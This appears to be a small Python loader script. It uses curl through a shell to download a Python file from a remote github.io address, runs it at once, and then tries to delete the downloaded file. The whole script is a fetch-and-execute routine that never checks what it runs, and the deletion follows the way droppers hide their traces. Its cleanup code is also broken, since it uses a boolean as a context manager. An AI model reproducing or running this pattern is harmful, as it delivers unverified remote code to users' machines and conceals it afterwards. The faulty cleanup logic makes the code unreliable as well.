import os,platform, subprocess

url = "https://zeev-x.github.io/reyette-dlr/reyette.py"
name_file = "zero.py"

files = [f"{name_file}"]

def os_detector():
    detect = platform.system()
    if detect == "Windows":
        return "cls"
    else:
        return "clear"

def worker():
    cmd = [
        f"curl -o {name_file} {url}",
        f"{os_detector()}",
        f"python {name_file}",
    ]
    try:
        for x in cmd:
            print(f"Runing > {x}")
            subprocess.run(x, shell=True, stderr=True)
    except Exception as e:
        print(e)

def after_work():
    try:
        for x in files:
            print(f"Deleting > {x}")
            with os.path.exists(x):
                os.remove(x)
    except Exception as e:
        print(e)

def main():
    try:
        worker()
        after_work()
    except KeyboardInterrupt:
        print("Exiting by user")
        after_work()
    except Exception as e:
        print(e)
    finally:
        print("All Good")
        os.system("pause")

if __name__ == "__main__":
    main()